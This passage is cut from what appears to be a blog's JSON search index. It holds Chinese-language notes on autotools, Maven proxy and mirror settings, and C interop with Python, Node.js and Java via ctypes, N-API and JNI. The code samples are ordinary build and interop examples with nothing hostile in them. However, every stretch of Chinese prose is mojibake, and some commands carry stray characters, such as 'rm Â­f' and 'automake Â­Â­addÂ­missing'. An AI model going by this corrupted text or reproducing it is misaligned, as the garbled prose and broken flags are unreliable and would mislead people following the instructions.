åŒ…./configuremakemake installï¼ˆå¯èƒ½è¦åˆ‡rootç”¨æˆ·ï¼‰è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œ éœ€è¦æœ‰ä¸€ä¸ª configure è„šæœ¬ï¼ŒåŒæ—¶ä¹Ÿéœ€è¦ä¸€ä¸ª Makefile æ–‡ä»¶ã€‚ è€Œ Autoconf å’Œ Automake å°±æ˜¯ä¸€å¥—è‡ªåŠ¨ç”Ÿæˆ configure è„šæœ¬å’Œ Makefile æ–‡ä»¶çš„å·¥å…·ã€‚ åœ¨ubuntuä¸Šå®‰è£…autoconf,automake,libtool: sudo apt install build-essential autoconf automake libtool libtool-bin autotools-dev configureæ–‡ä»¶æ˜¯ç”¨autoconfæ ¹æ®configure.acåˆ›å»ºå‡ºæ¥çš„ï¼Œè€Œconfigure.acèƒ½ç”¨autoscanè‡ªåŠ¨åˆ›å»ºå‡ºæ¥ éšä¾¿åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ $ lsepoch.c Makefile $ cat epoch.c #include &lt;stdio.h&gt; #include &lt;sys/time.h&gt; #include &lt;time.h&gt; #include &quot;config.h&quot; double get_epoch() { double sec; #ifdef HAVE_GETTIMEOFDAY struct timeval tv; gettimeofday(&amp;tv, NULL); sec = tv.tv_sec; sec += tv.tv_usec / 1000000.0; #else sec = time(NULL); #endif return sec; } int main(int argc, char* argv[]) { printf(&quot;%f\\n&quot;, get_epoch()); return 0; } è¿™ä¹ˆå†™çš„åŸå› æ˜¯gettimeofday()è¿™ä¸ªå‡½æ•°ä¸æ˜¯åœ¨æ‰€æœ‰çš„å¹³å°ä¸Šéƒ½æœ‰ï¼Œè¿™ç§æ—¶å€™å°±è¦ç”¨time()å‡½æ•°äº†ã€‚ $ cat Makefile # Makefile: A standard Makefile for epoch.c all: epoch clean: rm Â­f epoch è¿™æ ·å…¶å®å·²ç»å¯ä»¥ç›´æ¥makeç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶äº†ã€‚ä½†æ˜¯æˆ‘ä»¬ç”¨autoconfæ¥ç”Ÿæˆè¯•ä¸€ä¸‹ ç”Ÿæˆconfig.hæ–‡ä»¶config.hæ–‡ä»¶æ˜¯configureå‘½ä»¤æ ¹æ®config.h.inæ–‡ä»¶ç”Ÿæˆçš„ï¼Œconfig.h.inæ–‡ä»¶æ˜¯ç”±autoheaderï¼ˆCçš„source codeï¼‰ä¸­ç”Ÿæˆçš„ï¼ˆæ€»ä¹‹ä¹Ÿæ˜¯è‡ªåŠ¨çš„ï¼‰$ lsepoch.c Makefile$ autoscan$ lsautoscan.log configure.scan epoch.c Makefile$ mv configure.scan configure.ac$ lsautoscan.log configure.ac epoch.c Makefile$ autoheader$ lsautom4te.cache autoscan.log config.h.in configure.ac epoch.c Makefile$ mv Makefile Makefile.in$ autoconf$ lsautom4te.cache autoscan.log config.h.in configure configure.ac epoch.c Makefile.in$ ./configurechecking for gccâ€¦ gccchecking whether the C compiler worksâ€¦ yeschecking for C compiler default output file nameâ€¦ a.outchecking for suffix of executablesâ€¦checking whether we are cross compilingâ€¦ nochecking for suffix of object filesâ€¦ ochecking whether we are using the GNU C compilerâ€¦ yeschecking whether gcc accepts -gâ€¦ yeschecking for gcc option to accept ISO C89â€¦ none neededchecking how to run the C preprocessorâ€¦ gcc -Echecking for grep that handles long lines and -eâ€¦ /bin/grepchecking for egrepâ€¦ /bin/grep -Echecking for ANSI C header filesâ€¦ yeschecking for sys/types.hâ€¦ yeschecking for sys/stat.hâ€¦ yeschecking for stdlib.hâ€¦ yeschecking for string.hâ€¦ yeschecking for memory.hâ€¦ yeschecking for strings.hâ€¦ yeschecking for inttypes.hâ€¦ yeschecking for stdint.hâ€¦ yeschecking for unistd.hâ€¦ yeschecking sys/time.h usabilityâ€¦ yeschecking sys/time.h presenceâ€¦ yeschecking for sys/time.hâ€¦ yeschecking for gettimeofdayâ€¦ yesconfigure: creating ./config.statusconfig.status: creating Makefileconfig.status: creating config.h$ lsautom4te.cache autoscan.log config.h config.h.in config.log config.status configure configure.ac epoch.c Makefile Makefile.in$ make$ lsautom4te.cache config.h config.log configure epoch Makefileautoscan.log config.h.in config.status configure.ac epoch.c Makefile.in$ ./epoch1544345416.704451 //åˆ°æ­¤ç»“æŸï¼ˆè¿™æ ·åšçš„æ„ä¹‰åœ¨äºä¸€ä»½ä»£ç å°±èƒ½å¤Ÿæ‹¥æœ‰å¤šå¹³å°å…¼å®¹æ€§ï¼‰ å¦ä¸€ç§æ–¹å¼æ‰‹åŠ¨åˆ›é€ â€œMakefile.amâ€æ–‡ä»¶$ cat Makefile.am Makefile.am for epoch.cbin_PROGRAMS=epochepoch_SOURCES=epoch.c $ lsepoch.c Makefile.am $ autoscan$ mv configure.scan configure.ac$ autoheader$ lsautom4te.cache autoscan.log config.h.in configure.ac epoch.c Makefile.am$ vim configure.acæ”¹æˆè¿™æ · # -*- Autoconf -*- # Process this file with autoconf to produce a configure script. AC_PREREQ([2.69]) AC_INIT([FULL-PACKAGE-NAME], [VERSION], [BUG-REPORT-ADDRESS]) AM_INIT_AUTOMAKE AC_CONFIG_SRCDIR([epoch.c]) AC_CONFIG_HEADERS([config.h]) # Checks for programs. AC_PROG_CC # Checks for libraries. # Checks for header files. AC_CHECK_HEADERS([sys/time.h]) # Checks for typedefs, structures, and compiler characteristics. AC_HEADER_TIME # Checks for library functions. AC_CHECK_FUNCS([gettimeofday]) AC_CONFIG_FILES([Makefile]) AC_OUTPUT å…¶å®å°±æ˜¯åŠ äº†AM_INIT_AUTOMAKEè¿™ä¸€è¡Œè¿˜æœ‰AC_HEADER_TIME$ aclocal$ automake Â­Â­addÂ­missing Â­Â­copy$ autoconf$ ./configure åœ¨è¿™ä¸€æ­¥å› ä¸ºæ²¡æœ‰ç”ŸæˆMakefile.inæ‰€ä»¥åœä¸‹æ¥äº† pkg-configpkg-configæ˜¯èƒ½å¤Ÿä»ä¸€ä¸ªconfigæ–‡ä»¶ä¸­è¯»å–åˆ°ä¸€ä¸ªlibraryçš„ç›¸å…³ä¿¡æ¯çš„toolï¼Œè¯¥configæ–‡ä»¶ç”±libraryæä¾›ï¼Œç”¨äºæè¿°è¯¥libraryçš„include dirï¼Œbinary dirç­‰ä¿¡æ¯ã€‚å…·ä½“æ•™ç¨‹ å‚è€ƒhelloworldautotoolsæ•™ç¨‹Autoconf Tutorial Part-1another autotools tutorial","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"mavençš„ä¸€äº›ä¸œè¥¿","date":"2019-08-11T11:13:17.000Z","path":"2019/08/11/2019-08-11-maven-related-topics/","text":"mavençš„ä¸€äº›ä¸œè¥¿ mavenå®˜ç½‘æä¾›çš„é€šè¿‡å‘½ä»¤è¡Œåˆ›å»ºä¸€ä¸ªmavené¡¹ç›®çš„æ–¹æ³• mvn -B archetype:generate -DarchetypeGroupId=org.apache.maven.archetypes -DgroupId=com.mycompany.app -DartifactId=my-app //ä¸Šè¿°å‘½ä»¤ç”Ÿæˆçš„æ–‡ä»¶å¤¹å°±è¶³å¤Ÿäº†ï¼Œè¿pom.xmlä¹Ÿå¸®å¿™ç”Ÿæˆå¥½äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å»å¤åˆ¶ç²˜è´´pomé‡Œé¢çš„å†…å®¹ mvn compile ##å¼€å§‹ç¼–è¯‘ // æˆ–è€…è¿™ä¸¤æ¡ç›´æ¥æ”¶å·¥ mvn archetype:generate -DgroupId=com.websystique.maven -DartifactId=SampleMavenJavaProject -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false mvn -q clean compile exec:java -Dexec.mainClass=&quot;com.websystique.maven.App&quot; maven getting startedæ˜¯å¾ˆå‹å¥½çš„æ•™ç¨‹ çœ‹å®Œè¿™ä¿©å†ä¸ä¼šå°±æ˜¯è ¢jetbrainåœ¨youtubeä¸Šçš„æ•™ç¨‹Creating a new Maven project in IntelliJ IDEA create from archetypeå¯ä»¥é€‰æ‹©org.apache.maven.archetypes:maven-archetype-quickstart(çœŸçš„åªæœ‰ä¸€ä¸ªhello world)å¦‚æœæ˜¯springçš„è¯ï¼Œç›´æ¥ç”¨è¿™ä¸ªç½‘ç«™æ›´åŠ æ–¹ä¾¿ intelij ideaé‡Œé¢é»˜è®¤çš„mavenæºæœ‰https://repo.maven.apache.org/maven2å’Œhttp://download.java.net/maven/1è¿™ä¿©ç½‘ç«™å›½å†…ä¼¼ä¹è¢«å¢™ï¼Œæœ€å¥½åŠ ä»£ç† å°±æ˜¯åœ¨.m2/settings.xmlä¸­æŒ‡å®šæœ¬åœ°proxyã€‚å¦‚æœä½ çš„ä»£ç†å¤Ÿå¿«çš„è¯ï¼Œä¿®æ”¹pom.xmlçš„åŒæ—¶ï¼Œåº”è¯¥èƒ½å¤Ÿå¾ˆå¿«çš„å¼€å§‹ä¸‹è½½æ–°çš„ä¾èµ–intelijå†…ç½®äº†maven, ç”±äºç½‘é€Ÿçš„åŸå› ï¼Œä¸æƒ³æµªè´¹æ—¶é—´çš„è¯è¿˜æ˜¯ç»™MavenåŠ ä»£ç†:åœ¨~/.m2/settings.xmlä¸­æ‰¾åˆ°è¿™ä¸€æ®µï¼Œè¿™ä¸€æ®µåŸæœ¬æ˜¯è¢«æ³¨é‡Šæ‰çš„ï¼Œç«¯å£å’Œhostæ ¹æ®ä»£ç†è®¾ç½®ã€‚~/.m2/settings.xmlè¿™ä¸ªæ–‡ä»¶å¦‚æœä¸å­˜åœ¨ï¼Œå°±å»intelijçš„å®‰è£…ç›®å½•é‡Œé¢copyä¸€ä¸ªå‡ºæ¥æ¯”å¦‚è¿™æ ·ï¼š &lt;proxies&gt; &lt;proxy&gt; &lt;id&gt;optional&lt;/id&gt; &lt;active&gt;true&lt;/active&gt; &lt;protocol&gt;http&lt;/protocol&gt; &lt;host&gt;127.0.0.1&lt;/host&gt; &lt;port&gt;1080&lt;/port&gt; &lt;nonProxyHosts&gt;local.net|some.host.com&lt;/nonProxyHosts&gt; &lt;/proxy&gt; &lt;/proxies&gt; æˆ–è€…ç›´æ¥ç”¨é˜¿é‡Œäº‘çš„æºå®é™…æ“ä½œä¸­ï¼Œä½¿ç”¨é˜¿é‡Œäº‘çš„mavené•œåƒä¼¼ä¹æ›´å¿« &lt;mirrors&gt; &lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;/mirrors&gt; æ‰“å¼€é¡¹ç›®åï¼Œåœ¨Intellij å³ä¾§æœ‰ä¸ªMaven projectsï¼Œç‚¹å¼€åï¼Œæœ‰ä¸ªLifecycleï¼Œå†ç‚¹å¼€ï¼Œå¯ä»¥çœ‹åˆ°clean , validate, compile, â€¦.ï¼Œå³å‡»cleanï¼Œé€‰ä¸­Run â€˜project[clean]â€™ï¼Œè¿™é‡Œçš„projectæ˜¯æˆ‘ä»¬çš„é¡¹ç›®å®é™…çš„åå­—ã€‚å¦‚æœä¸‹è½½å¤±è´¥äº†çš„è¯ï¼Œå¯ä»¥é€‰æ‹©cleanï¼Œç„¶åå°±ä¼šå¼€å§‹è‡ªå·±é‡æ–°ä¸‹è½½ GroupIdç±»ä¼¼äºä½ çš„åŒ…åï¼ŒArtifictIdç±»ä¼¼äºä½ çš„applicationName mavenæ˜¯å¦‚ä½•è§£å†³ç‰ˆæœ¬å†²çªçš„(åŒä¸€ä¸ªpackageï¼Œä¸åŒç‰ˆæœ¬åŒæ—¶å­˜åœ¨)tbdgradleä¹Ÿæœ‰ä¸€å¥—è§£å†³æ–¹æ¡ˆï¼Œivyä¹Ÿæœ‰java 9 çš„moduleç³»ç»Ÿæ²¡æœ‰ maven ä¸­ä½¿ç”¨jaråŒ…çš„å¤šä¸ªç‰ˆæœ¬å®¹æ˜“é€ æˆä¾èµ–é—®é¢˜ï¼Œè§£å†³é—®é¢˜çš„æ–¹å¼å¯ä»¥å°†ä½¿ç”¨jaråŒ…çš„ç‰ˆæœ¬æ’é™¤æ‰ï¼Œæ¯”å¦‚dubboä½¿ç”¨netty 4.0.33ç‰ˆæœ¬å¯ä»¥å°†dubboæ’é™¤æ‰nettyä¾èµ–ï¼Œè¿™æ ·å…¶ä»–jaråŒ…å°±ä¸ä¼šå¼•ç”¨åˆ°netty4.0.33ç‰ˆæœ¬äº†ã€‚ &lt;dependency&gt; &lt;groupId&gt;com.jd&lt;/groupId&gt; &lt;artifactId&gt;jsf&lt;/artifactId&gt; &lt;version&gt;1.6.0&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;io.netty&lt;/groupId&gt; &lt;artifactId&gt;netty-all&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; mavenä¸­å¦‚ä½•é¡ºå¸¦æŠŠnativeçš„libraryä¹Ÿç»™æ‰“è¿›å»ã€‚å¯ä»¥å‚è€ƒnetty-transport-native-unix-common ä¸­çš„åšæ³•ï¼Œå†™ä¸€ä¸ªmakefileï¼Œä½¿ç”¨mavenæ’ä»¶è°ƒç”¨ç³»ç»Ÿçš„gccå‘½ä»¤ï¼Œä¼ å‚ã€‚æœ€ç»ˆæ‰“åŒ… å‚è€ƒ","tags":[]},{"title":"å„ç§ç¼–ç¨‹è¯­è¨€ä¸cã€c++çš„äº¤äº’","date":"2019-07-31T22:11:55.000Z","path":"2019/07/31/2019-07-31-interops-between-c-and-other-languages/","text":"1. cpython1.1 pythonä¸­è°ƒç”¨Cã€C++ä»£ç æ–¹æ³•ä¸€ï¼šPythonä¸­çš„ctypesæ¨¡å—å¯èƒ½æ˜¯è°ƒç”¨Cæ–¹æ³•æœ€ç®€å•çš„ä¸€ç§ã€‚ctypesæ¨¡å—æä¾›äº†å’ŒCè¯­è¨€å…¼å®¹çš„æ•°æ®ç±»å‹äº†å‡½æ•°æ¥åŠ è½½dllæˆ–è€…soæ–‡ä»¶ã€‚ cè¯­è¨€ä»£ç : add.c #include &lt;stdio.h&gt; int add_int(int, int); float add_float(float, float); int add_int(int num1, int num2){ return num1 + num2; } float add_float(float num1, float num2){ return num1 + num2; } ä¸‹é¢çš„å‘½ä»¤ç”Ÿæˆä¸€ä¸ªadder.soçš„æ–‡ä»¶ #For Linux$ gcc -shared -Wl,-soname,adder -o adder.so -fPIC add.c #For Mac$ gcc -shared -Wl,-install_name,adder.so -o adder.so -fPIC add.c pythonä»£ç  from ctypes import * #load the shared object file adder = CDLL(&#39;./adder.so&#39;) #Find sum of integers res_int = adder.add_int(4,5) print &quot;Sum of 4 and 5 = &quot; + str(res_int) #Find sum of floats a = c_float(5.5) b = c_float(4.1) add_float = adder.add_float add_float.restype = c_float print &quot;Sum of 5.5 and 4.1 = &quot;, str(add_float(a, b)) æ–¹æ³•äºŒï¼šPython/C APIï¼ˆc python extension ï¼‰å…¶å®å°±æ˜¯è‡ªå·±å†™python c extensionäº† #Though it looks like an ordinary python import, the addList module is implemented in C import addList l = [1,2,3,4,5] print &quot;Sum of List - &quot; + str(l) + &quot; = &quot; + str(addList.add(l)) //Python.h has all the required function definitions to manipulate the Python objects #include &lt;Python.h&gt; //This is the function that is called from your python code static PyObject* addList_add(PyObject* self, PyObject* args){ PyObject * listObj; //The input arguments come as a tuple, we parse the args to get the various variables //In this case it&#39;s only one list variable, which will now be referenced by listObj if (! PyArg_ParseTuple( args, &quot;O&quot;, &amp;listObj )) return NULL; //length of the list long length = PyList_Size(listObj); //iterate over all the elements int i, sum =0; for (i = 0; i &lt; length; i++) { //get an element out of the list - the element is also a python objects PyObject* temp = PyList_GetItem(listObj, i); //we know that object represents an integer - so convert it into C long long elem = PyInt_AsLong(temp); sum += elem; } //value returned back to python code - another python object //build value here converts the C long to a python integer return Py_BuildValue(&quot;i&quot;, sum); } //This is the docstring that corresponds to our &#39;add&#39; function. static char addList_docs[] = &quot;add( ): add all elements of the list\\n&quot;; /* This table contains the relavent info mapping - &lt;function-name in python module&gt;, &lt;actual-function&gt;, &lt;type-of-args the function expects&gt;, &lt;docstring associated with the function&gt; */ static PyMethodDef addList_funcs[] = { {&quot;add&quot;, (PyCFunction)addList_add, METH_VARARGS, addList_docs}, {NULL, NULL, 0, NULL} }; /* addList is the module name, and this is the initialization block of the module. &lt;desired module name&gt;, &lt;the-info-table&gt;, &lt;module&#39;s-docstring&gt; */ PyMODINIT_FUNC initaddList(void){ Py_InitModule3(&quot;addList&quot;, addList_funcs, &quot;Add all ze lists&quot;); } 1.2 Cã€C++è°ƒç”¨pythonä»£ç å‚è€ƒä¸Šé¢çš„python c extensionæ–¹æ³•ï¼Œå¯ä»¥åœ¨cè¯­è¨€ä¸­æ“ä½œpythonå¯¹è±¡ 1.3 pythonè°ƒç”¨ç³»ç»Ÿæ–¹æ³•## ç¬¬ä¸€ç§ os.system(command) ## ç¬¬äºŒç§ import subprocess subprocess.Popen(args, bufsize=0, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=False, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0) subprocess.call([&quot;cmd&quot;, &quot;arg1&quot;, &quot;arg2&quot;],shell=True) ç›®å‰pythonå®˜æ–¹æ¨èçš„è°ƒç”¨æ–¹æ³•çš„æ–¹å¼è¿˜æ˜¯subprocessã€‚ cython(python c extension)å’Œcpython(cè¯­è¨€å®ç°çš„pythonï¼‰æ˜¯ä¸¤ä»¶äº‹ 2. javascript2.1 javascriptè°ƒç”¨Cã€C++ä»£ç é¦–å…ˆï¼Œåœ¨æµè§ˆå™¨ä¸­è¿è¡Œcè¯­è¨€çš„ä»£ç ï¼Œä¼¼ä¹å¯ä»¥å°†Cç¼–æˆWebAssemblyåœ¨æµè§ˆå™¨ä¸­è¿è¡Œã€‚è€Œåœ¨Node jsä¸­ï¼Œå¯ä»¥ä½¿ç”¨n-apiè¿™ä¸ªmoduleã€‚ N-API (pronounced N as in the letter, followed by API) is an API for building native Addons. It is independent from the underlying JavaScript runtime (for example, V8) and is maintained as part of Node.js itself. This API will be Application Binary Interface (ABI) stable across versions of Node.js. It is intended to insulate Addons from changes in the underlying JavaScript engine and allow modules compiled for one major version to run on later major versions of Node.js without recompilation. å°±æ˜¯è¯´ä¿æŒäº†binary compatibilityï¼Œæ¯”å¦‚è¯´åœ¨node6ä¸Šç¼–è¯‘é€šè¿‡ä¹‹åï¼Œå‡å¦‚åé¢å‡ºäº†node10ï¼Œä¸éœ€è¦é‡æ–°ç¼–è¯‘ä¹Ÿèƒ½ç»§ç»­è¿è¡Œã€‚ node-gyp(gypæ˜¯generate your projectçš„æ„æ€)å¯ä»¥ç¼–è¯‘ç”Ÿæˆnode js addonï¼Œå…¶å®ä¹Ÿå°±æ˜¯åœ¨hostæœºå™¨ä¸Šç”Ÿæˆå¯¹åº”çš„æœºå™¨ç ä¸‹é¢çœ‹å¦‚ä½•ä½¿ç”¨:how-to-call-c-c-code-from-node-jså¾ˆå¤šå¤§å‹jsé¡¹ç›®éƒ½æœ‰ä¸€ä¸ªbinging.gypæ–‡ä»¶ï¼ˆä¸€å®šæ˜¯è¿™ä¸ªåå­—ï¼‰ node js addon åœ¨jsä»£ç ä¸­è¿˜æ˜¯importçš„æ–¹å¼ youtubeä¸Šæœ‰ä¸€ä¸ª2019å¹´çš„windowsä¸Šçš„æ•™ç¨‹ gypå…¶å®æ˜¯ä¸€ä¸ªç”¨æ¥ç”Ÿæˆé¡¹ç›®æ–‡ä»¶çš„å·¥å…·ï¼Œä¸€å¼€å§‹æ˜¯è®¾è®¡ç»™chromiumé¡¹ç›®ä½¿ç”¨çš„ï¼Œåæ¥å¤§å®¶å‘ç°æ¯”è¾ƒå¥½ç”¨å°±ç”¨åˆ°äº†å…¶ä»–åœ°æ–¹ã€‚ç”Ÿæˆé¡¹ç›®æ–‡ä»¶åå°±å¯ä»¥è°ƒç”¨GCC, vsbuild, xcodeç­‰ç¼–è¯‘å¹³å°æ¥ç¼–è¯‘ã€‚è‡³äºä¸ºä»€ä¹ˆè¦æœ‰node-gypï¼Œæ˜¯ç”±äºnodeç¨‹åºä¸­éœ€è¦è°ƒç”¨ä¸€äº›å…¶ä»–è¯­è¨€ç¼–å†™çš„å·¥å…·ç”šè‡³æ˜¯dllï¼Œéœ€è¦å…ˆç¼–è¯‘ä¸€ä¸‹ï¼Œå¦åˆ™å°±ä¼šæœ‰è·¨å¹³å°çš„é—®é¢˜ï¼Œä¾‹å¦‚åœ¨windowsä¸Šè¿è¡Œçš„è½¯ä»¶copyåˆ°macä¸Šå°±ä¸èƒ½ç”¨äº†ï¼Œä½†æ˜¯å¦‚æœæºç æ”¯æŒï¼Œç¼–è¯‘ä¸€ä¸‹ï¼Œåœ¨macä¸Šè¿˜æ˜¯å¯ä»¥ç”¨çš„ã€‚ 2.2 Cã€C++è°ƒç”¨javascriptä»£ç JavaScript is not a compiled language æ‰€ä»¥è¿™ä¹ˆåšè™½ç„¶å¯è¡Œï¼Œä½†æ˜¯æ¯”è¾ƒéº»çƒ¦ã€‚ä¸”ç½‘ä¸Šçš„æ•™ç¨‹å¤šæ•°æ˜¯c++çš„ã€‚ 2.3 javascriptè°ƒç”¨ç³»ç»Ÿæ–¹æ³•åœ¨node js ä¸­å¯ä»¥ä½¿ç”¨child_processæ¨¡å— // myProgram.c #include &lt;stdio.h&gt; int main(void){ puts(&quot;4&quot;); return 0; } gcc -o myProgram myProgram.c const { exec } = require(&quot;child_process&quot;); exec(&quot;./myProgram&quot;, (error, stdout, stderr) =&gt; console.log(stdout)); 3. javaå…¶å®å°±æ˜¯jniäº†ï¼ŒTo be honest, if you have any other choice besides using JNI, do that other thing.å¦‚æœä¸æ˜¯æ²¡æœ‰javaçš„è§£å†³æ–¹æ³•ï¼Œä¸è¦ä½¿ç”¨jniï¼Œä¸€ä¸ªæ˜¯éº»çƒ¦ï¼Œå¦ä¸€ä¸ªæ˜¯æˆ‘ä»¬å½»åº•å¤±å»äº†è·¨å¹³å°å…¼å®¹æ€§ è¿™ç¯‡æ–‡ç« æ˜¯æˆ‘è§è¯†è¿‡çš„æœ€æ–°æ‰‹å‹å¥½çš„jniè§£é‡Š JNIçš„æµç¨‹ç½‘ä¸Šæœ‰ä¸€å¤§å †ï¼Œæ³¨æ„çš„æ˜¯ä¸åŒçš„å¹³å°gccçš„å‚æ•°æ˜¯ä¸ä¸€æ ·çš„ï¼Œä¸‰æ­¥ç›´æ¥æå®š,åœ¨linuxä¸Šäº²æµ‹è¿™æ ·æ˜¯å¯ä»¥çš„ ## ç”Ÿæˆå¤´æ–‡ä»¶å…¶å®ä¹Ÿå¾ˆç®€å• javac -h . HelloJNI2.java ## å…ˆæ˜¯ç”Ÿæˆ.oæ–‡ä»¶ gcc -c -I /usr/lib/jvm/java-8-openjdk-amd64/include -I /usr/lib/jvm/java-8-openjdk-amd64/include/linux jni/hellojni.c ## ç„¶åæ‰“æˆsharedLibrary gcc -rdynamic -shared -o libhellojni.so hellojni.o ## åœ¨intelijé‡Œé¢classæ–‡ä»¶éƒ½æ”¾åœ¨target/classesç›®å½•ä¸‹ï¼Œè¿™ä¹ˆä¸€å¥è¯å°±èƒ½æŠŠä»£ç è·‘èµ·æ¥ java -cp .:target/classes com.me.harris.jupiter.channel.HelloJNI è¿™ä¸¤æ­¥èµ°å®Œï¼Œå°±åœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆäº†libhellojni.soæ–‡ä»¶ï¼Œæ¥ä¸‹æ¥çœ‹javaä»£ç è¿™è¾¹ä½¿ç”¨System.loadLibraryçš„å‰ææ˜¯æŠŠè¿™ä¸ªsoæ–‡ä»¶æ‰”åˆ°/usr/libè¿™ä¸€ç±»çš„æ–‡ä»¶å¤¹é‡Œé¢ï¼Œæˆ–è€…ä½¿ç”¨-Djava.library.pathæŒ‡å®šå…·ä½“ç‚¹çš„è¯ï¼š System.out.println(System.getProperty(&quot;java.library.path&quot;)); // æ‰“å°å‡ºæ¥ /usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib // loadLibrary(&quot;hello&quot;)å°±æ˜¯å»ä¸Šè¿°ç›®å½•é‡Œé¢æ‰¾ä¸€ä¸ªå«åšlibhello.soçš„æ–‡ä»¶ï¼Œæ²¡æœ‰çš„è¯å°±æŠ¥é”™ //java -cp . -Djava.library.path=/NATIVE_SHARED_LIB_FOLDER com.xxx.xxx String currentDir = System.getProperty(&quot;user.dir&quot;); //è¿™ä¸ªå°±æ˜¯pwd System.load(currentDir+&quot;/&quot;+&quot;libhellojni.so&quot;); //loadåˆ™æ˜¯ç»™å‡ºæ–‡ä»¶çš„ç»å¯¹è·¯å¾„,è¿™é‡Œé¢çš„æ–œçº¿ç…§è¯´ä¹Ÿè¦ä¾æ®å¹³å°åŒºåˆ†çš„,System.getProperty(&quot;line.separator&quot;) 3.1 javaè°ƒç”¨Cã€C++ä»£ç è¯¦ç»†æ•™ç¨‹è¿™ä¸ªæ²¡ä»€ä¹ˆå¥½è¯´çš„ 3.2 Cã€C++è°ƒç”¨javaä»£ç cã€c++å±‚è°ƒç”¨javaä¹Ÿæ˜¯å¯ä»¥çš„,ç”šè‡³å¯ä»¥åœ¨nativeå±‚åˆ›å»ºä¸€ä¸ªjavaå®ä¾‹è¿”å›ç»™javaå±‚ï¼Œæ‰€ä»¥åˆ›å»ºä¸€ä¸ªjavaå¯¹è±¡çš„æ–¹æ³•è‡³å°‘åŒ…æ‹¬new,unsafe,Constructor.newInstanceä»¥åŠjniã€‚(å…¶å®è¿˜åŒ…æ‹¬cloneï¼Œ ObjectInputStream.readObjectæ–¹æ³•) unsafeçš„æ–¹å¼åªæ˜¯åˆ†é…å†…å­˜ï¼Œå¹¶ä¸è°ƒç”¨æ„é€ å‡½æ•°ã€‚ //1. ç”¨newå…³é”®å­—ï¼Œè¿™ä¸ªæ²¡ä»€ä¹ˆå¥½è¯´çš„ //2. ç”¨unsafe Unsafe#allocateInstance(Class&lt;?&gt;) //3. ç”¨java.lang.reflect.Constructor.newInstance(Object... initargs) Constructor.java public T newInstance(Object... initargs) throws InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException class.java public native T newInstance() throws InstantiationException, IllegalAccessException; åŒºåˆ«: class.newInstance()åªèƒ½åå°„æ— å‚çš„æ„é€ å‡½æ•°(åªèƒ½publicçš„),å¯¹äºæ•è·çš„æˆ–è€…æœªæ•è·çš„å¼‚å¸¸å‡ç”±æ„é€ å‡½æ•°æŠ›å‡º(åº•å±‚è°ƒç”¨çš„æ˜¯Constructor.newInstance((Object[])null)ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥ä¼ ä¸€ä¸ªnullè¿›å»çš„) Constructor.newInstance()å¯ä»¥åå°„ä»»ä½•æ„é€ å‡½æ•°(åŒ…æ‹¬ç§æœ‰)ï¼Œé€šå¸¸ä¼šæŠŠæŠ›å‡ºçš„å¼‚å¸¸å°è£…æˆInvocationTargetExceptionæŠ›å‡ºã€‚ // 4.jniç›´æ¥æ“ä½œ //å…³é”®å°±è¿™ä¹ˆä¸€å¥ï¼Œæ³¨æ„è¿™ä¸€å¥æ˜¯ä¸ä¼šè°ƒç”¨åˆ°æ— å‚çš„æ„é€ å‡½æ•°çš„ã€‚ env-&gt;AllocObject(userDataClass); å¥½å¥‡çœ‹äº†çœ¼unsafeçš„hotspotæºç  åŸæ¥ç”¨çš„ä¹Ÿæ˜¯AllocObject UNSAFE_ENTRY(jobject, Unsafe_AllocateInstance(JNIEnv *env, jobject unsafe, jclass cls)) UnsafeWrapper(&quot;Unsafe_AllocateInstance&quot;); { ThreadToNativeFromVM ttnfv(thread); return env-&gt;AllocObject(cls); } UNSAFE_END æ¯”æ–¹è¯´å…¥å£æ–‡ä»¶å«åšcom.me.harris.jupiter.channel.HelloJNI2.javaç”Ÿæˆçš„å¤´æ–‡ä»¶å°±å«åšcom_me_harris_jupiter_channel_HelloJNI2.hg++çš„å‚æ•°æœ‰ä¸€ç‚¹ç‚¹åŒºåˆ« g++ -c -fPIC -I${JAVA_HOME}/include -I${JAVA_HOME}/include/linux com_me_harris_jupiter_channel_HelloJNI2.cpp -o com_me_harris_jupiter_channel_HelloJNI2.o g++ -shared -fPIC -o libnative.so com_me_harris_jupiter_channel_HelloJNI2.o -lc mv libnative.so jni java -cp .:target/classes -Djava.library.path=jni com.me.harris.jupiter.channel.HelloJNI2 ## javaå‘½ä»¤è¡Œå‚æ•°ä¸€ä¸ªæ¯”è¾ƒçƒ¦äººçš„åœ°æ–¹å°±æ˜¯com.example.Mainè¿™ä¸ªclasséå¾—è¦å»ä¸€ä¸ªcom/exampleæ–‡ä»¶å¤¹ä¸‹é¢æœ‰è¿™ä¸ªclassæ–‡ä»¶ ##cpçš„æ„æ€å°±æ˜¯classpathäº†ï¼Œè¿™ä¸ªå‘½ä»¤è¦èƒ½è·‘æˆåŠŸï¼Œå‰ææ˜¯targetæ–‡ä»¶å¤¹ä¸‹æœ‰ä¸ªcom/me/harris/jupiter/channel/è¿™ä¹ˆä¸€è¿ä¸²çš„æ–‡ä»¶å¤¹ java classpathçš„åˆ†éš”ç¬¦,åœ¨windowsä¸Šæ˜¯; åœ¨unixä¸Šæ˜¯: 